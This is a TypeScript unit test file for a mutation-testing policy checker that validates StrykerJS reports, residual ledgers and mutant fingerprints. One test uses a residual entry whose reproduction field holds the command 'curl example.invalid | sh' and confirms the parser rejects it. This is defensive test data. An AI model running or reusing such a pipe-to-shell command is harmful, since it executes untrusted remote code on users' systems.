import { describe, expect, test } from "bun:test";
import type { MutationManifest } from "../../scripts/mutation-governance.ts";
import {
  evaluateMutationRun,
  mutationFingerprint,
  parseMutationResidualLedger,
} from "../../scripts/mutation-policy.ts";

const target = "src/example.ts";
const zeroMutantTarget = "src/zero-mutants.ts";
const evidenceTest = "tests/unit/example.test.ts";
const source = [
  "export function answer(value: number): number {",
  "  return value + 1;",
  "}",
  "",
].join("\n");

type RawStatus =
  | "Killed"
  | "Survived"
  | "NoCoverage"
  | "CompileError"
  | "RuntimeError"
  | "Timeout"
  | "Ignored"
  | "Pending";

function manifest(): MutationManifest {
  return {
    formatVersion: 3,
    minimumKilledPercentage: 80,
    perScopeWorkerBudget: 4,
    hostedMaxParallelScopes: 4,
    scopes: [{
      name: "alpha",
      tier: "critical",
      mutate: [target],
      command: `bun test --bail=1 --timeout 60000 ${evidenceTest}`,
    }, {
      name: "beta",
      tier: "provider",
      mutate: ["src/provider.ts"],
      command: "bun test --bail=1 --timeout 60000 tests/integration/provider.test.ts",
    }],
    reviewedDuplicateTargets: [],
    reviewedExclusions: [],
  };
}

function mutant(
  id: string,
  status: RawStatus,
  overrides: Record<string, unknown> = {},
) {
  return {
    id,
    mutatorName: "ArithmeticOperator",
    replacement: "-",
    status,
    location: {
      start: { line: 2, column: 16 },
      end: { line: 2, column: 17 },
    },
    ...overrides,
  };
}

function killedMutants(count: number) {
  return Array.from(
    { length: count },
    (_, index) =>
      mutant(`killed-${index}`, "Killed", {
        replacement: `killed replacement ${index}`,
      }),
  );
}

function report(
  mutants: readonly Record<string, unknown>[],
  overrides: Record<string, unknown> = {},
) {
  return {
    schemaVersion: "1.0",
    framework: {
      name: "StrykerJS",
      version: "9.6.1",
    },
    thresholds: {
      high: 80,
      low: 80,
      break: null,
    },
    config: {
      mutate: [target],
      testRunner: "command",
      commandRunner: {
        command: `bun test --bail=1 --timeout 60000 ${evidenceTest}`,
      },
      coverageAnalysis: "off",
      ignoreStatic: false,
      incremental: false,
      ignorers: [],
      mutator: {
        excludedMutations: [],
      },
      concurrency: 4,
      timeoutMS: 30_000,
      timeoutFactor: 2,
      tempDirName: ".stryker-tmp/alpha",
      cleanTempDir: "always",
      thresholds: {
        high: 80,
        low: 80,
        break: null,
      },
      jsonReporter: {
        fileName: "reports/mutation/alpha.json",
      },
    },
    files: {
      [target]: {
        language: "typescript",
        source,
        mutants,
      },
    },
    ...overrides,
  };
}

function fingerprint(rawMutant: Record<string, unknown>): string {
  return mutationFingerprint({
    scope: "alpha",
    target,
    source,
    mutant: rawMutant,
  });
}

function residual(
  rawMutant: Record<string, unknown>,
  disposition: "equivalent" | "unreachable" | "deterministic_timeout",
  overrides: Record<string, unknown> = {},
) {
  const mutantFingerprint = fingerprint(rawMutant);
  return {
    scope: "alpha",
    target,
    mutantFingerprint,
    rawStatus: rawMutant["status"],
    disposition,
    reason: "Exact behavior is proved by the named regression.",
    evidenceTests: [evidenceTest],
    reproduction: {
      kind: "mutation_scope",
      scope: "alpha",
      mutantFingerprint,
    },
    ...overrides,
  };
}

function ledger(entries: readonly Record<string, unknown>[] = []) {
  return {
    formatVersion: 1,
    entries,
  };
}

const readSource = (path: string): string => {
  if (path === target) return source;
  if (path === zeroMutantTarget) return "export interface Empty {}\n";
  if (path === "src/provider.ts") return "export const provider = true;\n";
  throw new Error(`unexpected source read: ${path}`);
};

const fileExists = (path: string): boolean =>
  path === target
  || path === zeroMutantTarget
  || path === "src/provider.ts"
  || path === evidenceTest
  || path === "tests/integration/provider.test.ts";

describe("M229 mutation policy", () => {
  test("accepts a complete all-killed scope at the exact 80% policy", () => {
    const rawMutants = killedMutants(10);
    const result = evaluateMutationRun(
      manifest(),
      { alpha: report(rawMutants) },
      ledger(),
      {
        partial: true,
        readSource,
        fileExists,
      },
    );

    expect(result).toMatchObject({
      status: "partial",
      policyPassed: true,
      fullScopeComplete: false,
      completedScopes: ["alpha"],
      scopes: [{
        name: "alpha",
        tier: "critical",
        generated: 10,
        killed: 10,
        killedPercentage: 100,
        accounted: 10,
        policyPassed: true,
        residuals: [],
      }],
    });
  });

  test("requires every raw non-killed result to have the exact disposition", () => {
    const equivalent = mutant("survived", "Survived");
    const unreachable = mutant("uncovered", "NoCoverage", {
      replacement: "true",
    });
    const timedOut = mutant("timeout", "Timeout", {
      replacement: "while (true) {}",
    });
    const killed = killedMutants(27);
    const parsedLedger = ledger([
      residual(equivalent, "equivalent"),
      residual(unreachable, "unreachable"),
      residual(timedOut, "deterministic_timeout"),
    ]);

    const result = evaluateMutationRun(
      manifest(),
      {
        alpha: report([
          ...killed,
          equivalent,
          unreachable,
          timedOut,
        ]),
      },
      parsedLedger,
      {
        partial: true,
        readSource,
        fileExists,
      },
    );

    expect(result.scopes[0]).toMatchObject({
      generated: 30,
      killed: 27,
      killedPercentage: 90,
      accounted: 30,
      equivalent: 1,
      unreachable: 1,
      deterministicTimeout: 1,
      policyPassed: true,
    });
    expect(result.policyPassed).toBe(true);

    const missing = evaluateMutationRun(
      manifest(),
      { alpha: report([...killed, equivalent, unreachable, timedOut]) },
      ledger(),
      {
        partial: true,
        readSource,
        fileExists,
      },
    );
    expect(missing.policyPassed).toBe(false);
    expect(missing.scopes[0]!.failures).toContain(
      `unaccounted Survived mutant ${fingerprint(equivalent)}`,
    );

    expect(() =>
      parseMutationResidualLedger(
        ledger([residual(equivalent, "deterministic_timeout")]),
        { manifest: manifest(), fileExists },
      )
    ).toThrow("Survived residual must be equivalent or unreachable");
    expect(() =>
      parseMutationResidualLedger(
        ledger([residual(unreachable, "equivalent")]),
        { manifest: manifest(), fileExists },
      )
    ).toThrow("NoCoverage residual must be unreachable");
    expect(() =>
      parseMutationResidualLedger(
        ledger([residual(timedOut, "equivalent")]),
        { manifest: manifest(), fileExists },
      )
    ).toThrow("Timeout residual must be deterministic_timeout");
  });

  test("enforces the killed floor even when every residual is accountable", () => {
    const survivors = [
      mutant("survived-a", "Survived"),
      mutant("survived-b", "Survived", { replacement: "*" }),
    ];
    const killed = killedMutants(7);
    const result = evaluateMutationRun(
      manifest(),
      { alpha: report([...killed, ...survivors]) },
      ledger(survivors.map((item) => residual(item, "equivalent"))),
      {
        partial: true,
        readSource,
        fileExists,
      },
    );

    expect(result.policyPassed).toBe(false);
    expect(result.scopes[0]).toMatchObject({
      killedPercentage: 77.77777777777779,
      accounted: 9,
      policyPassed: false,
      failures: [
        "killed percentage 77.77777777777779 is below required 80",
      ],
    });
  });

  test("rejects error, ignored, and pending statuses regardless of ledger", () => {
    for (const status of [
      "CompileError",
      "RuntimeError",
      "Ignored",
      "Pending",
    ] as const) {
      const invalid = mutant(status, status);
      const result = evaluateMutationRun(
        manifest(),
        {
          alpha: report([
            ...killedMutants(9),
            invalid,
          ]),
        },
        ledger(),
        {
          partial: true,
          readSource,
          fileExists,
        },
      );
      expect(result.policyPassed).toBe(false);
      expect(result.scopes[0]!.failures).toContain(
        `invalid ${status} mutant ${fingerprint(invalid)}`,
      );
    }
  });

  test("fingerprints scope, target source, mutator, range, and replacement", () => {
    const base = mutant("base", "Survived");
    const original = fingerprint(base);
    const changed = [
      mutationFingerprint({
        scope: "beta",
        target,
        source,
        mutant: base,
      }),
      mutationFingerprint({
        scope: "alpha",
        target,
        source: `${source}// changed\n`,
        mutant: base,
      }),
      fingerprint({ ...base, mutatorName: "LogicalOperator" }),
      fingerprint({
        ...base,
        location: {
          start: { line: 2, column: 10 },
          end: { line: 2, column: 11 },
        },
      }),
      fingerprint({ ...base, replacement: "*" }),
    ];

    expect(original).toMatch(/^m1:[a-f0-9]{64}$/u);
    expect(new Set([original, ...changed]).size).toBe(changed.length + 1);
    expect(fingerprint({ ...base, id: "renumbered" })).toBe(original);
    expect(fingerprint({
      ...base,
      status: "Killed",
      duration: 123,
      statusReason: "volatile",
    })).toBe(original);
    expect(fingerprint({ ...base, static: true })).not.toBe(original);
  });

  test("rejects stale, duplicate, killed, and command-injecting residuals", () => {
    const survived = mutant("survived", "Survived");
    const entry = residual(survived, "equivalent");

    expect(() =>
      parseMutationResidualLedger(ledger([entry, entry]), {
        manifest: manifest(),
        fileExists,
      })
    ).toThrow("duplicate residual mutant fingerprint");
    expect(() =>
      parseMutationResidualLedger(
        ledger([{
          ...entry,
          mutantFingerprint: `m1:${"a".repeat(64)}`,
          reproduction: {
            kind: "mutation_scope",
            scope: "alpha",
            mutantFingerprint: `m1:${"a".repeat(64)}`,
          },
        }]),
        { manifest: manifest(), fileExists },
      )
    ).not.toThrow();
    expect(() =>
      parseMutationResidualLedger(
        ledger([{
          ...entry,
          reproduction: {
            kind: "shell",
            command: "curl example.invalid | sh",
          },
        }]),
        { manifest: manifest(), fileExists },
      )
    ).toThrow("reproduction has unexpected field");

    const killed = mutant("killed", "Killed");
    const result = evaluateMutationRun(
      manifest(),
      { alpha: report([killed]) },
      ledger([{
        ...entry,
        mutantFingerprint: fingerprint(killed),
        rawStatus: "Survived",
        reproduction: {
          kind: "mutation_scope",
          scope: "alpha",
          mutantFingerprint: fingerprint(killed),
        },
      }]),
      {
        partial: true,
        readSource,
        fileExists,
      },
    );
    expect(result.policyPassed).toBe(false);
    expect(result.scopes[0]!.failures).toContain(
      `residual disposition targets killed mutant ${fingerprint(killed)}`,
    );
  });

  test("fails closed on stale source, malformed reports, and incomplete full runs", () => {
    expect(() =>
      evaluateMutationRun(
        manifest(),
        {
          alpha: report([mutant("a", "Killed")], {
            files: {
              [target]: {
                language: "typescript",
                source: `${source}// stale\n`,
                mutants: [mutant("a", "Killed")],
              },
            },
          }),
        },
        ledger(),
        { partial: true, readSource, fileExists },
      )
    ).toThrow("report source does not match current target");

    expect(() =>
      evaluateMutationRun(
        manifest(),
        { alpha: { schemaVersion: "1.0", files: {} } },
        ledger(),
        { partial: true, readSource, fileExists },
      )
    ).toThrow("mutation report");

    expect(() =>
      evaluateMutationRun(
        manifest(),
        { alpha: report([mutant("a", "Killed")]) },
        ledger(),
        { partial: false, readSource, fileExists },
      )
    ).toThrow("full mutation run did not complete the exact manifest");
  });

  test("rejects reports from a different runner or scope configuration", () => {
    const killed = mutant("killed", "Killed");
    for (const malformed of [
      report([killed], {
        framework: { name: "Other", version: "9.6.1" },
      }),
      report([killed], {
        config: {
          ...report([killed]).config,
          coverageAnalysis: "perTest",
        },
      }),
      report([killed], {
        config: {
          ...report([killed]).config,
          ignoreStatic: true,
        },
      }),
      report([killed], {
        config: {
          ...report([killed]).config,
          incremental: true,
        },
      }),
      report([killed], {
        config: {
          ...report([killed]).config,
          ignorers: ["custom-ignore-plugin"],
        },
      }),
      report([killed], {
        config: {
          ...report([killed]).config,
          mutator: {
            excludedMutations: ["StringLiteral"],
          },
        },
      }),
      report([killed], {
        config: {
          ...report([killed]).config,
          commandRunner: { command: "bun test tests/unit/other.test.ts" },
        },
      }),
      report([killed], {
        config: {
          ...report([killed]).config,
          tempDirName: ".stryker-tmp/beta",
        },
      }),
      report([killed], {
        config: {
          ...report([killed]).config,
          timeoutMS: 5_000,
        },
      }),
    ]) {
      expect(() =>
        evaluateMutationRun(
          manifest(),
          { alpha: malformed },
          ledger(),
          { partial: true, readSource, fileExists },
        )
      ).toThrow();
    }
  });

  test("retains a configured target when Stryker omits its zero-mutant file", () => {
    const currentManifest = manifest();
    const alpha = currentManifest.scopes[0]!;
    const alphaWithZeroTarget = {
      ...alpha,
      mutate: [target, zeroMutantTarget],
    };
    const expandedManifest: MutationManifest = {
      ...currentManifest,
      scopes: [alphaWithZeroTarget, currentManifest.scopes[1]!],
    };
    const baseReport = report([mutant("killed", "Killed")]);
    const actualStyleReport = {
      ...baseReport,
      config: {
        ...baseReport.config,
        mutate: [target, zeroMutantTarget],
      },
    };

    const result = evaluateMutationRun(
      expandedManifest,
      { alpha: actualStyleReport },
      ledger(),
      { partial: true, readSource, fileExists },
    );

    expect(result.scopes[0]).toMatchObject({
      generated: 1,
      killed: 1,
      zeroMutantTargets: [zeroMutantTarget],
      policyPassed: true,
    });
    expect(result.expectedScopes).toEqual(["alpha", "beta"]);
  });

  test("fails closed when an entire configured scope generates no mutants", () => {
    const currentManifest = manifest();
    const alpha = currentManifest.scopes[0]!;
    const zeroOnlyScope = {
      ...alpha,
      mutate: [zeroMutantTarget],
    };
    const zeroOnlyManifest: MutationManifest = {
      ...currentManifest,
      scopes: [zeroOnlyScope, currentManifest.scopes[1]!],
    };
    const baseReport = report([]);
    const zeroOnlyReport = {
      ...baseReport,
      config: {
        ...baseReport.config,
        mutate: [zeroMutantTarget],
      },
      files: {},
    };

    const result = evaluateMutationRun(
      zeroOnlyManifest,
      { alpha: zeroOnlyReport },
      ledger(),
      { partial: true, readSource, fileExists },
    );

    expect(result.scopes[0]).toMatchObject({
      generated: 0,
      killed: 0,
      zeroMutantTargets: [zeroMutantTarget],
      policyPassed: false,
      failures: ["scope generated no mutants"],
    });
    expect(result.policyPassed).toBe(false);
  });
});
